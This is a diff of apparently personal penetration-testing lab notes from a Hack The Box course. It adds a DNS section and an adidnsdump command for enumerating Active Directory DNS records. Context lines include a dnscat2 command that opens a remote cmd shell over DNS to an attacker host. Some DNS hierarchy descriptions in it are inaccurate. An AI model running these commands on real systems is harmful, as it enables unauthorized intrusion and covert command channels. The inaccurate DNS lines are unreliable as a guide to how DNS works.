@@ -1,3 +1,4 @@
+# DNS
 
 - **Root Servers:** Manage highest level of DNS hierarchy and oversee top level domains globally, stepping in if lower level servers fail to respond 
 - **Authoritative Name Servers:** hold final authority for queries within designated zones, providing definitive responses. If they cannot respond, queries escalated to root servers
@@ -45,6 +46,11 @@ sudo python3 -m http.server --bind 0.0.0.0
 ```powershell prompt:C:\Users\htb-student>
 Import-Module .\dnscat2.ps1
 Start-DNScat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
+```
+## DNS Record with adidnsdump 
+```
+adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
+```
 ```
 
 # Post Exploitation 
